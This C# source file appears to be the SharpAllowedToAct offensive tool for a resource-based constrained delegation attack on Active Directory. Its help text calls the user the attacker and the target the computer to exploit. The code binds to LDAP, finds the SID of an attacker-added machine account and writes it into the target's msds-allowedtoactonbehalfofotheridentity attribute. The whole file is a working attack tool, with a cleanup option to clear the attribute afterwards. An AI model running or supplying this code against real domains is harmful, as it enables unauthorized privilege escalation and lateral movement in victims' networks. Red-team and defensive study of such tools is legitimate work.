﻿using System;
using System.Text;
using System.Security.AccessControl;
using System.Security.Principal;
using CommandLine;
using System.Net;

namespace AddMachineAccount
{
    public class Options
    {
        [Option("a", "DomainController", Required = false, HelpText = "Set the domain controller to use.")]
        public string DomainController { get; set; }

        [Option("d", "Domain", Required = false, HelpText = "Set the target domain.")]
        public string Domain { get; set; }

        [Option("m", "ComputerAccountName", Required = false, HelpText = "Set machine name added by the attacker.")]
        public string ComputerAccountName { get; set; }

        [Option("u", "LdapUsername", Required = false, HelpText = "Set the Ldap Username.")]
        public string LdapUsername { get; set; }

        [Option("p", "LdapPassword", Required = false, HelpText = "Set the Ldap Password.")]
        public string LdapPassword { get; set; }

        [Option("t", "TargetComputer", Required = true, HelpText = "Set the name of the target computer you want to exploit. Need to have write access to the computer object.")]
        public string TargetComputer { get; set; }

        [Option("c", "Cleanup", HelpText = "Empty the value of msds-allowedtoactonbehalfofotheridentity for a given computer account (Usage: '--Cleanup true'). Must be combined with --TargetComputer")]
        public string Cleanup { get; set; }

    }

    class Program
    {

        public static void PrintHelp()
        {
            string HelpText = "\nUsage: SharpAllowedToAct.exe --ComputerAccountName FAKECOMPUTER --LdapUsername username --LdapPassword password --TargetComputer VICTIM\n" +
                "\nOptions:\n" +
                "\n-m, --ComputerAccountName\n" +
                "\tSet machine name added by the attacker.\n" +
                "\n" +
                "-u, --LdapUsername\n" +
                "\tSet the Ldap Username.\n" +
                "\n" +
                 "-p, --LdapPassword\n" +
                "\tSet the Ldap Password.\n" +
                "\n" +
                "-t, --TargetComputer\n" +
                "\tSet the name of the target computer you want to exploit. Need to have write access to the computer object.\n" +
                "\n" +
                "-a, --DomainController\n" +
                "\tSet the domain controller to use.\n" +
                "\n" +
                "-d, --Domain\n" +
                "\tSet the target domain.\n" +
                "\n" +
                "-c, --Cleanup\n" +
                "\tEmpty the value of msds-allowedtoactonbehalfofotheridentity for a given computer account (Usage: '--Cleanup true'). Must be combined with --TargetComputer.\n" +
                "\n";
            Console.WriteLine(HelpText);
        }

        public static void SetSecurityDescriptor(String Domain, String DomainController, String victim_distinguished_name, String victimcomputer, String sid, String ldapuser, String ldappass, bool cleanup)
        {
            // get the domain object of the victim computer and update its securty descriptor 
            String LDAP_URL = "LDAP://" + DomainController;
            System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(LDAP_URL, ldapuser, ldappass);
            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);
            search.Filter = "(cn=" + victimcomputer + ")";
            string[] requiredProperties = new string[] { "samaccountname" };

            foreach (String property in requiredProperties)
                search.PropertiesToLoad.Add(property);

            System.DirectoryServices.SearchResult result = null;
            try
            {
                result = search.FindOne();
            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex.Message + "Exiting...");
                return;
            }


            if (result != null)
            {
                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();

                String sec_descriptor = "";
                if (!cleanup)
                {
                    sec_descriptor = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid + ")";
                    System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);
                    byte[] descriptor_buffer = new byte[sd.BinaryLength];
                    sd.GetBinaryForm(descriptor_buffer, 0);
                    // Add AllowedToAct Security Descriptor
                    entryToUpdate.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = descriptor_buffer;
                }
                else
                {
                    // Cleanup attribute
                    Console.WriteLine("[+] Clearing attribute...");
                    entryToUpdate.Properties["msds-allowedtoactonbehalfofotheridentity"].Clear();
                }

                try
                {
                    // Commit changes to the security descriptor
                    entryToUpdate.CommitChanges();
                    Console.WriteLine("[+] Attribute changed successfully");
                    Console.WriteLine("[+] Done!");
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine("[!] Could not update attribute!\nExiting...");
                    return;
                }
            }

            else Console.WriteLine("[!] Computer Account not found!\nExiting...");
            return;
        }

        static void Main(string[] args)
        {
            if (args == null)
            {
                PrintHelp();
                return;
            }

            String DomainController = "";
            String Domain = "";
            String MachineAccount = "";
            String DistinguishedName = "";
            String ldapuser = "";
            String ldappass = "";
            String victimcomputer = "";

            var Options = new Options();


            if (CommandLineParser.Default.ParseArguments(args, Options))
            {
                if ((!string.IsNullOrEmpty(Options.LdapPassword) && !string.IsNullOrEmpty(Options.TargetComputer) && !string.IsNullOrEmpty(Options.ComputerAccountName)) || (!string.IsNullOrEmpty(Options.Cleanup) && !string.IsNullOrEmpty(Options.TargetComputer)))
                {
                    if (!string.IsNullOrEmpty(Options.DomainController))
                    {
                        DomainController = Options.DomainController;
                    }
                    if (!string.IsNullOrEmpty(Options.Domain))
                    {
                        Domain = Options.Domain;
                    }
                    if (!string.IsNullOrEmpty(Options.ComputerAccountName))
                    {
                        MachineAccount = Options.ComputerAccountName;
                    }
                    if (!string.IsNullOrEmpty(Options.LdapUsername))
                    {
                        ldapuser = Options.LdapUsername;
                    }
                    if (!string.IsNullOrEmpty(Options.LdapPassword))
                    {
                        ldappass = Options.LdapPassword;
                    }
                    if (!string.IsNullOrEmpty(Options.TargetComputer))
                    {
                        victimcomputer = Options.TargetComputer;
                    }
                }
                else
                {
                    Console.Write("[!] Missing required arguments! Exiting...\n");
                    //PrintHelp();
                    return;
                }
            }
            else
            {
                Console.Write("[!] Missing required arguments! Exiting...\n");
                PrintHelp();
                return;
            }

            String cleanup = Options.Cleanup;

            // If a domain controller and domain were not provide try to find them automatically
            System.DirectoryServices.ActiveDirectory.Domain current_domain = null;
            if (DomainController == String.Empty || Domain == String.Empty)
            {
                try
                {
                    current_domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain();
                }
                catch
                {
                    Console.WriteLine("[!] Cannot enumerate domain.\n");
                    return;
                }

            }

            if (DomainController == String.Empty)
            {
                DomainController = current_domain.PdcRoleOwner.Name;
            }

            if (Domain == String.Empty)
            {
                Domain = current_domain.Name;
            }

            Domain = Domain.ToLower();

            String machine_account = MachineAccount;
            String sam_account = "";
            if (MachineAccount.EndsWith("$"))
            {
                sam_account = machine_account;
                machine_account = machine_account.Substring(0, machine_account.Length - 1);
            }
            else
            {
                sam_account = machine_account + "$";
            }


            String distinguished_name = DistinguishedName;
            String victim_distinguished_name = DistinguishedName;
            String[] DC_array = null;

            distinguished_name = "CN=" + machine_account + ",CN=Computers";
            victim_distinguished_name = "";
            DC_array = Domain.Split('.');

            foreach (String DC in DC_array)
            {
                distinguished_name += ",DC=" + DC;
                victim_distinguished_name += ",DC=" + DC;
            }
            victim_distinguished_name = victim_distinguished_name.TrimStart(',');


            //this check is lame but cannot make the switch work with CommandLine :)
            if (cleanup == "true")
            {
                SetSecurityDescriptor(Domain, DomainController, victim_distinguished_name, victimcomputer, null, ldapuser, ldappass, true);
                return;
            }

            if (cleanup != null)
            {
                Console.WriteLine("Cleanup must be set to \"true\"\n. Exiting...");
                return;
            }

            Console.WriteLine("[+] Domain = " + Domain);
            Console.WriteLine("[+] Domain Controller = " + DomainController);
            Console.WriteLine("[+] Machine added by the attacker = " + sam_account);
            Console.WriteLine("[+] Distinguished Name = " + distinguished_name);
            Console.WriteLine("[+] Try login.");
            try
            { 
            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);
            NetworkCredential nc = new NetworkCredential(ldapuser, ldappass);
            System.DirectoryServices.Protocols.LdapConnection connection = null;

            connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);
            connection.SessionOptions.Sealing = true;
            connection.SessionOptions.Signing = true;
            connection.Bind();


            // Get SID of the new computer object
            var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(&(samAccountType=805306369)(|(name=" + machine_account + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
            var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
            SecurityIdentifier sid = null;

            foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)
            {
                try
                {
                    sid = new SecurityIdentifier(entry.Attributes["objectsid"][0] as byte[], 0);
                    Console.Out.WriteLine("[+] SID of the machine added by the attacker: " + sid.Value);
                }
                catch
                {
                    Console.WriteLine("[!] It was not possible to retrieve the SID.\nExiting...");
                    return;
                }
            }

            SetSecurityDescriptor(Domain, DomainController, victim_distinguished_name, victimcomputer, sid.Value, ldapuser, ldappass, false);
        }
            catch
            {
                Console.WriteLine("[!] Ldap Login Failed OR Machine Can't Find. ");
                return;
            }
    }

    }
}


